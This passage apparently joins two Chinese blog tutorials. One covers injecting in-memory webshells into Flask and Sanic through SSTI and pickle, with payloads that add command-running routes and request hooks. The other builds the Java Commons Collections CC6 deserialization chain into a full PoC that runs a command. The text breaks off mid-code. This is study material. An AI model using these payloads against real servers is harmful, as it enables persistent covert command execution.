什么是内存马？\n\n其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大\n\n### 什么是python内存马？\n\n`Python 内存马`利用`Flask`框架中`SSTI`注入来实现, `Flask`框架中在`web`应用模板渲染的过程中用到`render_template_string`进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现`Python`内存马的注入.\n\n## 0x02旧版Flask下的内存马\n\n为什么要说是旧版呢？这源于我在看一篇关于[FLASK下python内存马](https://www.cnblogs.com/gxngxngxn/p/18181936)的研究的文章的时候发现21年的flask2.x和新版的flask3.x的内存马攻击姿势是不一样的，具体如何我们一步步跟着走就知道了\n\n参考文章：[flask不出网回显方式](https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/)\n\n### 环境搭建\n\n首先就是安装flask2.x版本的框架\n\n```\npip install flask==2.0.0\n```\n\n成功后我们还需要安装**Werkzeug**，因为我之前是用的3.x，导致跟flask2.x不兼容了，所以得降版本\n\n```\npip install \"werkzeug>=2.0.0,<3.0.0\"\n```\n\n正常的话直接安装就行\n\n```\npip install werkzeug==2.0.0\n```\n\n安装好后我们输出一下flask的版本\n\n```python\nimport flask\n\nprint(flask.__version__)\n#2.0.0\n```\n\n然后我们测试一下框架\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef Hello():\n    return 'Hello World!'\n```\n\n然后运行框架访问5000端口就可以了\n\n```\nflask run\n```\n\n### 赛题环境\n\n然后我们来搭一个测试环境\n\n```python\n# app.py\nfrom flask import Flask, request, session, render_template_string, url_for, redirect\nimport pickle\nimport io\nimport sys\nimport base64\nimport random\nimport subprocess\nfrom config import notadmin\n\napp = Flask(__name__)\n\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if module in ['config'] and \"__\" not in name:\n            return getattr(sys.modules[module], name)\n        raise pickle.UnpicklingError(\"'%s.%s' not allowed\" % (module, name))\n\n\ndef restricted_loads(s):\n    \"\"\"Helper function analogous to pickle.loads().\"\"\"\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n\n\n@app.route('/')\ndef index():\n    info = request.args.get('name', '')\n    if info is not '':\n        x = base64.b64decode(info)\n        User = restricted_loads(x)\n    return render_template_string('Hello')\n\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=5000)\n\n```\n\n```python\n# config.py\nnotadmin = {\"admin\": \"no\"}\n\n\ndef backdoor(cmd):\n    if notadmin[\"admin\"] == \"yes\":\n        s = ''.join(cmd)\n        eval(s)\n\n```\n\n代码分析\n\n这里的话会对传入的name参数进行一个base64解码和pickle反序列化操作，在RestrictedUnpickler函数中只允许从config模块加载该类，并且禁止加载带有下划线的方法\n\n这道题的话其实一眼就可以看出来了，就是一个pickle反序列化的问题，但是这里的重点并不在于反序列化，而是在于如何利用eval函数去回显，但是赛题的环境靶机是不出网的，所以打不了反弹shell（自己本地搭的不知道怎么设置靶机不出网emmm）那么这时候又该怎么去让我们的命令回显呢？\n\n### debug模式下的报错回显\n\n在flask中，如果开启了debug模式的话，报错是会显示详细信息的，所以我们尝试手动控制报错语句让我们的命令执行并回显\n\n构造exp\n\n```python\nfrom base64 import b64encode\nfrom urllib.parse import quote\n\n\ndef base64_encode(s: str, encoding='utf-8') -> str:\n    return b64encode(s.encode()).decode(encoding=encoding)\n\n\nexc = \"raise Exception(__import__('os').popen('whoami').read())\"\nexc = base64_encode(exc).encode()\n\nopcode = b'''cconfig\nnotadmin\n(S'admin'\nS'yes'\nu0(cconfig\nbackdoor\n(S'exec(__import__(\"base64\").b64decode(b\"%s\"))'\nlo.''' % (exc)\n\nprint(quote(b64encode(opcode).decode()))\n```\n\n这里的话将 `whoami` 的结果作为异常消息。\n\n![image-20250609132422946](../image/achieve/202411/flask内存马/image-20250609132422946.png)\n\n成功执行命令并回显，但这个并不是我们内存马的内容，下面才是主要的\n\n### 路由注入的内存马\n\n这个的话就暂时不用赛题的环境了，我们自己搭一个测试的环境\n\n```python\nfrom flask import Flask ,request\nfrom flask import render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef Hello():\n    return 'Hello World!'\n\n@app.route('/test',methods=['POST','GET'])\ndef test():\n    name = request.args.get('name', 'guest')\n    template = '''\n    <h1>Hello, %s!\n    '''%(name)\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run()\n```\n\n之前也说过，python内存马都是在ssti下进行注入的，这里参考了文章https://github.com/iceyhexman/flask_memory_shell，这篇文章讲的是如何利用flask去添加恶意路由，但是问题在于如何拿到我们正在运行的app\n\n```python\nimport sys\nsys.modules['__main__'].__dict__['app'].debug=False\nsys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :__import__('os').popen('dir').read())\n```\n\n直接在app.py中添加后访问/shell路由\n\n![image-20250609134240706](../image/achieve/202411/flask内存马/image-20250609134240706.png)\n\n成功执行dir命令，那我们试图构造一下poc\n\n```python\nurl_for.__globals__['__builtins__']['eval'](\"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())\",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})\n```\n\n我们分析一下这个poc\n\n```python\nurl_for.__globals__['__builtins__']['eval'](\n    \"app.add_url_rule(\n        '/shell', \n        'shell', \n        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()\n    )\",\n    {\n        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],\n        'app':url_for.__globals__['current_app']\n    }\n)\n```\n\n`url_for`是`Flask`的一个内置函数, 通过`Flask`内置函数可以调用其`__globals__`属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的`modules`, 可以看到这里是支持`__builtins__`的，并且在`__builtins__`模块中是存在`eval`、`exec`等内置的命令执行函数的.\n\n由于存在命令执行函数, 因此我们就可以直接调用命令执行函数来执行危险操作\n\n```python\napp.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())\n```\n\n这里的话是动态添加了一条路由shell，而处理该路由的函数是个由`lambda`关键字定义的匿名函数\n\n在`Flask`中注册路由的时候是添加的`@app.route()`装饰器来实现的, 跟进查看其源码实现, 发现其调用了`add_url_rule`函数来添加路由.\n\n![image-20250609140546272](../image/achieve/202411/flask内存马/image-20250609140546272.png)\n\n然后我们跟进app.add_url_rule函数\n\n```python\n    def add_url_rule(\n        self,\n        rule: str,\n        endpoint: str | None = None,\n        view_func: ft.RouteCallable | None = None,\n        provide_automatic_options: bool | None = None,\n        **options: t.Any,\n    ) -> None:\n        \"\"\"\"\"\"\n        raise NotImplementedError\n```\n\n- rule: 函数对应的`URL`规则, 满足条件和`app.route`的第一个参数一样, 必须以`/`开头.\n- endpoint: 端点, 即在使用`url_for`进行反转的时候, 这里传入的第一个参数就是`endpoint`对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为`endpoint`的值.\n- view_func: `URL`对应的函数, 这里只需写函数名字而不用加括号.\n- provide_automatic_options: 控制是否应自动添加选项方法.\n- options: 要转发到基础规则对象的选项.\n\n结合我们的poc分析，`Payload`中`add_url_rule`函数的第三个参数定义了一个`lambda`匿名函数, 其中通过`os`库的`popen`函数执行从`Web`请求中获取的`cmd`参数值并返回结果, 其中该参数值默认为`whoami`。\n\n然后我们再来看最后一部分\n\n```python\n{\n        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],\n        'app':url_for.__globals__['current_app']\n    }\n```\n\n这里的话是获取了一个_request_ctx_stack全局变量，以及获取当前的app\n\n所以到这里分析完了之后我们就大概可以知道一整个流程是怎么做的了，`eval`函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证`app`和`_request_ctx_stack`都可以被找到\n\n我们通过ssti执行poc\n\n```\n?name={{url_for.__globals__['__builtins__']['eval'](\"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())\",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}\n```\n\n传参后访问/shell路由发现初始的cmd值whoami成功执行\n\n![image-20250609134451361](../image/achieve/202411/flask内存马/image-20250609134451361.png)\n\n然后传入cmd参数可以执行命令\n\n![image-20250609134557790](../image/achieve/202411/flask内存马/image-20250609134557790.png)\n\n## 0x03新版Flask下的内存马\n\n参考文章https://www.cnblogs.com/gxngxngxn/p/18181936\n\n我们现在将Flask更新一下，更新到Flask3. x版本\n\n```\npip install --upgrade flask\n```\n\n此时我的版本是flask-3.1.1 werkzeug-3.1.3\n\n然后我们试一下刚刚的poc发现出现报错了，这是为什么呢？\n\n![image-20250609135108942](../image/achieve/202411/flask内存马/image-20250609135108942.png)\n\n```\nAssertionError: The setup method 'add_url_rule' can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.\nMake sure all imports, decorators, functions, etc. needed to set up the application are done before running it.\n```\n\n出现了报错？难道是我debug没关吗？但是关掉了还是这样，这是为啥？在文章中师傅指出，这是因为触发了一个check函数才造成的无法调用，但是最终还是因为flask版本问题，所以就引出了新版本的flask内存马\n\n首先我们得先了解两个方法before_request after_request\n\n[[Flask 使用 after_request 和 before_request 处理特定请求的方法|极客教程 (geek-docs.com)](https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html)]\n\n### 使用before_request方法\n\n![image-20250609141032945](../image/achieve/202411/flask内存马/image-20250609141032945.png)\n\n由于这是在请求之前执行的操作，所以会在我们每次请求的时候调用这个方法，我们跟进看一下这个函数\n\n![image-20250609141344088](../image/achieve/202411/flask内存马/image-20250609141344088.png)\n\n```python\nbefore_request_funcs.setdefault(None, []).append(f)\n```\n\n扔给ai解释一下\n\n| `before_request_funcs`  | Flask 应用内部的字典，存储所有请求前处理器（`before_request` 函数）。 |\n| ----------------------- | ------------------------------------------------------------ |\n| `.setdefault(None, [])` | 若字典中键 `None` 不存在，则将其值设为空列表 `[]`，否则返回现有值。 |\n| `.append(f)`            | 将函数 `f` 添加到 `None` 键对应的列表中。                    |\n\n这里只要我们设置f为一个匿名函数就行，类似之前的\n\n```python\nlambda :__import__('os').popen('whoami').read()\n```\n\n所以我们尝试调用这个函数\n\n```python\neval(\"__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('dir').read())\")\n```\n\n![image-20250609141926329](../image/achieve/202411/flask内存马/image-20250609141926329.png)\n\n成功了\n\n### 使用 after_request方法\n\n![image-20250609142028036](../image/achieve/202411/flask内存马/image-20250609142028036.png)\n\n同样的，这个方法是在每个请求处理完成之后执行的，我们跟进一下这个函数\n\n![image-20250609142124488](../image/achieve/202411/flask内存马/image-20250609142124488.png)\n\n和之前那个没区别，直接参考大佬的构造\n\n```python\neval(\"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\\\"global CmdResp;CmdResp=__import__(\\'flask\\').make_response(__import__(\\'os\\').popen(request.args.get(\\'cmd\\')).read())\\\")==None else resp)\")\n```\n\n在请求完成后调用,跟上面那个一样，唯一需要注意的是这个是需要定义一个返回值的，不然就报错。\n\n放在ssti的话就是通过模块去调用eval函数了\n\n除此之外还有其他的几个构造函数\n\n![img](../image/achieve/202411/flask内存马/3181170-20240509130942991-1709772057.png)\n\n## 0x04回顾赛题\n\n既然学的差不多了，那我们重新返回刚刚的赛题看看\n\n利用构造poc\n\n```python\nimport os\nimport pickle\nimport base64\nclass A():\n    def __reduce__(self):\n        return (eval,(\"__import__(\\\"sys\\\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('gxngxngxn')).read())\",))\n\na = A()\nb = pickle.dumps(a)\nprint(base64.b64encode(b))\n```\n\n```python\nimport os\nimport pickle\nimport base64\nclass A():\n    def __reduce__(self):\n        return (eval,(\"__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('gxngxngxn') and exec(\\\"global CmdResp;CmdResp=__import__(\\'flask\\').make_response(__import__(\\'os\\').popen(request.args.get(\\'gxngxngxn\\')).read())\\\")==None else resp)\",))\n\na = A()\nb = pickle.dumps(a)\nprint(base64.b64encode(b))\n```\n\n## 0x05sanic下的内存马\n\n第一种依旧是路由注入，但poc上有一些不一样\n\n测试代码\n\n```python\nfrom sanic import Sanic\nfrom sanic.response import json,text\n\napp = Sanic(\"hello\")\n\n\n@app.route('/',methods=['GET','POST'])\nasync def hello(request):\n    cmd = request.form.get('cmd')\n    print(eval(cmd))\n\n    return text(\"ok\")\n\n#\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8000)\n```\n\n### 路由注入\n\n```python\napp.add_route(lambda request: __import__(\"os\").popen(request.args.get(\"cmd\")).read(),\"/shell\", methods=[\"GET\"])\n```\n\n\n\n","tags":["python内存马"],"categories":["python内存马"]},{"title":"Java反序列化CC6链","url":"/2025/06/07/Java反序列化CC6链/","content":"\n参考文章：https://www.cnblogs.com/CVE-Lemon/p/17935937.html\n\nhttps://infernity.top/2024/04/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/\n\n## 0x01漏洞分析\n\n之前入手反序列化分析了一波CC1链，也算是开始对java反序列化有一个初步认识了，那必须得来分析一下最好用的CC利用链CC6了因为CC6适用的jdk版本更多，并且commons collections 小于等于3.2.1，都存在这个漏洞，所以CC6也算是最好用的链子了\n\n## 0x02影响版本&链子分析\n\n**JDK ≤ 8u76**\n\n**CommonsCollections <= 3.2.1**\n\n\n\n### LazyMap#get()\n\n链子的出口依旧是之前的出口\n\n```java\nChainedTransformer.transform()->InvokerTransformer.transform()->Runtime.exec()\n```\n\n然后我们来找找ChainedTransformer.transform()的触发，来到了LazyMap的get方法\n\n![image-20250608125937668](../image/achieve/202411/java学习/image-20250608125937668.png)\n\n依旧是通过LazyMap的get方法去触发ChainedTransformer.transform()进而触发InvokerTransformer.transform()\n\n因为之前讲CC1的时候并没有细说这个get方法，所以我们先分析一下LazyMap的get方法\n\n```java\npublic Object get(Object key) {\n    // 1. 检查 key 是否存在于 Map 中\n    if (map.containsKey(key) == false) {\n        // 2. 如果 key 不存在，调用 factory.transform(key) 生成 value\n        Object value = factory.transform(key);\n        // 3. 将 (key, value) 存入 Map\n        map.put(key, value);\n        // 4. 返回新生成的 value\n        return value;\n    }\n    // 5. 如果 key 已存在，直接返回对应的 value\n    return map.get(key);\n}\n```\n\n这个方法实质上是一个\"懒加载\"，**核心逻辑就是如果key不在Map中，则会自动生成一个值并存入key，否则就会返回已有的值**，这里可以看到是根据factory.transform方法生成value的，所以我们看看factory是否可控\n\n```java\n    protected final Transformer factory;\n```\n\n是受保护类型的，并不可控，但是我们可以发现这里同样存在着一个跟TransformedMap的decorate一样的decorate方法\n\n```java\npublic static Map decorate(Map map, Factory factory) {\n        return new LazyMap(map, factory);\n    }\n```\n\n这里会生成一个LazyMap对象，并且这个方法的静态方法，意味着我们可以直接调用该方法去实例化一个LazyMap对象，进而控制factory的值\n\n所以我们到这为止的poc就是\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);\n        lazyMap.get(\"1\");\n\n    }\n}\n```\n\n![image-20250608131310289](../image/achieve/202411/java学习/image-20250608131310289.png)\n\n接下来我们继续往前推进寻找入口点\n\n### TiedMapEntry#getvalue()\n\n我们全局找一下get方法的实现，发现太多了，毕竟是复现的，跟着之前的师傅的链子走就行，找到一个TiedMapEntry类\n\n![image-20250608131551923](../image/achieve/202411/java学习/image-20250608131551923.png)\n\n该类中的getvalue方法\n\n```java\n    public Object getValue() {\n        return map.get(key);\n    }\n```\n\n这里getValue调用了get方法，但是map是否可控呢？\n\n```java\nprivate final Map map;\n```\n\n好吧，私有属性也是不可控的，我们寻找一下构造方法\n\n```java\npublic TiedMapEntry(Map map, Object key) {\n        super();\n        this.map = map;\n        this.key = key;\n    }\n```\n\n哎，公共方法，那就好处理了，直接用反射去构造一个TiedMapEntry实例化对象\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);\n\n        Class A = Class.forName(\"org.apache.commons.collections.keyvalue.TiedMapEntry\");\n        Constructor constructor = A.getDeclaredConstructor(Map.class, Object.class);\n        TiedMapEntry tiedMapEntry = (TiedMapEntry) constructor.newInstance(lazyMap,\"1\");\n        tiedMapEntry.getValue();\n    }\n}\n```\n\n![image-20250608132303167](../image/achieve/202411/java学习/image-20250608132303167.png)\n\n接下来我们找找如何调用getValue方法\n\n### TiedMapEntry的hashCode\n\n这个比较好找，就在该类下的hashCode方法\n\n```java\npublic int hashCode() {\n    Object value = getValue();\n    return (getKey() == null ? 0 : getKey().hashCode()) ^\n           (value == null ? 0 : value.hashCode()); \n}\n```\n\n这里无条件调用getValue方法，所以直接触发这个方法就行了\n\n总结：**TiedMapEntry的hashCode方法调用了getValue，getValue调用了get方法，所以可以用TiedMapEntry的hashCode方法调用LazyMap的get方法**\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        \n        //CC1的后半段\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        \n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        \n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);\n        \n        //CC6\n        //反射去获取一个TiedMapEntry对象\n        Class A = Class.forName(\"org.apache.commons.collections.keyvalue.TiedMapEntry\");\n        Constructor constructor = A.getDeclaredConstructor(Map.class, Object.class);\n        TiedMapEntry tiedMapEntry = (TiedMapEntry) constructor.newInstance(lazyMap,\"1\");\n        tiedMapEntry.hashCode();\n    }\n}\n```\n\n![image-20250608132552816](../image/achieve/202411/java学习/image-20250608132552816.png)\n\n接下来寻找谁调用了hashCode方法\n\n### HashMap#hash()\n\nHashMap的hash方法调用了hashCode方法\n\n```java\n    static final int hash(Object key) {\n        int h;\n        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);\n    }\n```\n\n然后key是在HashMap类的readObject方法来的\n\n### HashMap#readObject()\n\n```java\nprivate void readObject(java.io.ObjectInputStream s)\n        throws IOException, ClassNotFoundException {\n        // Read in the threshold (ignored), loadfactor, and any hidden stuff\n        s.defaultReadObject();\n        reinitialize();\n        if (loadFactor <= 0 || Float.isNaN(loadFactor))\n            throw new InvalidObjectException(\"Illegal load factor: \" +\n                                             loadFactor);\n        s.readInt();                // Read and ignore number of buckets\n        int mappings = s.readInt(); // Read number of mappings (size)\n        if (mappings < 0)\n            throw new InvalidObjectException(\"Illegal mappings count: \" +\n                                             mappings);\n        else if (mappings > 0) { // (if zero, use defaults)\n            // Size the table using given load factor only if within\n            // range of 0.25...4.0\n            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);\n            float fc = (float)mappings / lf + 1.0f;\n            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?\n                       DEFAULT_INITIAL_CAPACITY :\n                       (fc >= MAXIMUM_CAPACITY) ?\n                       MAXIMUM_CAPACITY :\n                       tableSizeFor((int)fc));\n            float ft = (float)cap * lf;\n            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?\n                         (int)ft : Integer.MAX_VALUE);\n            @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n                Node<K,V>[] tab = (Node<K,V>[])new Node[cap];\n            table = tab;\n\n            // Read the keys and values, and put the mappings in the HashMap\n            for (int i = 0; i < mappings; i++) {\n                @SuppressWarnings(\"unchecked\")\n                    K key = (K) s.readObject();\n                @SuppressWarnings(\"unchecked\")\n                    V value = (V) s.readObject();\n                putVal(hash(key), key, value, false, false);\n            }\n        }\n    }\n```\n\n![image-20250608133212369](../image/achieve/202411/java学习/image-20250608133212369.png)\n\n序列化的时候可以用HashMap的put方法传key和value\n\n```java\npublic V put(K key, V value) {\n        return putVal(hash(key), key, value, false, true);\n    }\n```\n\n但是HashMap的put方法会提前调用hash方法，导致提前走完流程\n\n```java\n    static final int hash(Object key) {\n        int h;\n        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);\n    }\n```\n\n我们先试一下利用put触发hashCode方法\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"1\");\n        map.put(tiedMapEntry, \"value\");\n    }\n\n}\n```\n\n![image-20250608133942999](../image/achieve/202411/java学习/image-20250608133942999.png)\n\n## 0x03调整调用链\n\n由于HashMap的put方法会调用hash函数导致提前调用hashCode方法，从而在序列化前就命令执行，但是我们需要找到一个readObject的链子入口\n\n在我参考的师傅的文章中讲到一个很神奇的思路，就是说我们利用put设置key的时候先让LazyMap对象的map值为一个任意的Transformer对象，等设置了key之后再利用反射设置变量修改回原来的ChainedTransformer对象。\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(\"1\"));\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"1\");\n        HashMap<Object,Object> hashmap = new HashMap<>();\n        hashmap.put(tiedMapEntry, \"3\");\n\n        //反射修改值\n        Class<LazyMap> lazyMapClass = LazyMap.class;\n        Field factory = lazyMapClass.getDeclaredField(\"factory\");\n        factory.setAccessible(true);\n        factory.set(lazyMap, chainedTransformer);\n\n        serialize(hashmap);\n        unserialize(\"CC6.txt\");\n\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC6.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n\n}\n\n```\n\n但是这里没触发是为什么呢？\n\n定位到LazyMap的get方法，这里`map.containsKey(key)`是true，所以不会执行tramsform，从而不会命令执行。\n\n![image-20250608140312496](../image/achieve/202411/java学习/image-20250608140312496.png)\n\n之前我们就注意到，当我们map没包含这个key的话就会自动生成键值对并传入，这样就会导致反序列化时map里已经存在这个key了，所以不会执行`factory.transform(key)`，从而导致无法命令执行。所以我们需要在put之后手动把这个key删掉\n\n```\nlazymap.remove(\"2\");\n```\n\n## 0x04最终的poc&&链子\n\n### 最终的链子\n\n```java\nHashMap.readObject()\nHashMap.hash()+\n    TiedMapEntry.hashCode()\n    TiedMapEntry.getValue()\n        LazyMap.get()\n            ChainedTransformer.transform()\n                InvokerTransformer.transform()\n                    Method.invoke()\n                        Runtime.exec()\n```\n\n### 最终的poc\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformer);\n        \n        //生成LazyMap对象并传给TiedMapEntry\n        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(\"1\"));\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"2\");\n        \n        //在put中修改factory，导致不会触发hash，并移除key\n        HashMap<Object,Object> hashmap = new HashMap<>();\n        hashmap.put(tiedMapEntry, \"3\");\n        lazyMap.remove(\"2\");\n\n        //反射修改factory值\n        Class<LazyMap> lazyMapClass = LazyMap.class;\n        Field factory = lazyMapClass.getDeclaredField(\"factory\");\n        factory.setAccessible(true);\n        factory.set(lazyMap, chainedTransformer);\n\n        serialize(hashmap);\n        unserialize(\"CC6.txt\");\n\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC6.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    